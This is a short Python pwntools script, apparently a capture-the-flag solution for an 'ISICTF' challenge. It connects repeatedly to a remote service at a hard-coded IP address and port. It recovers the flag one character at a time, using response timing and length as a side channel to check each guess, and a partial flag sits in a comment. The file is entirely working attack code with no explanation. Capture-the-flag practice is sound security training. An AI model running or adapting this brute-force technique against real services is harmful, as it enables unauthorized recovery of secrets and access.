from pwn import * 
import time 
from string import ascii_letters

d = ''.join(list(map(str,list(range(10)))))  + ascii_letters + '_'  +'}'; 

#flag='ISICTF{71me_4tt4ck_15_4'
flag='ISICTF{'
curr=""
sec=2
while curr!='}' :
    for i in d :
        p=remote('34.72.15.9',1107) 
        p.recvuntil(b'Please input the flag:')
        p.sendline(f'{flag}{i}'.encode())
        time.sleep(sec)
        out=p.clean()

        if ( len(out)==483 ) : continue
        else :
            curr=i
            flag+=i
            print(flag)
            sec+=1
            break;


#483